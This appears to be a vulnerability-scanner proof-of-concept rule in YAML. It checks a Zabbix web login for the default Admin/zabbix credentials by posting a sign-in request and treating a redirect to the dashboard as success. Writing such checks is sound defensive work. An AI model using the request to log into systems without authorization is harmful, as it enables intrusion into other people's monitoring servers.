name: poc-yaml-zabbix-defacult-password
rules:
  - method: POST
    path: /index.php
    body: name=Admin&password=zabbix&autologin=1&enter=Sign+in
    expression: |
      response.status == 302 && response.headers["location"] == "zabbix.php?action=dashboard.view"
detail:
  author: fuzz7j(https://github.com/fuzz7j)
  links:
    - https://www.zabbix.com/documentation/3.4/zh/manual/quickstart/login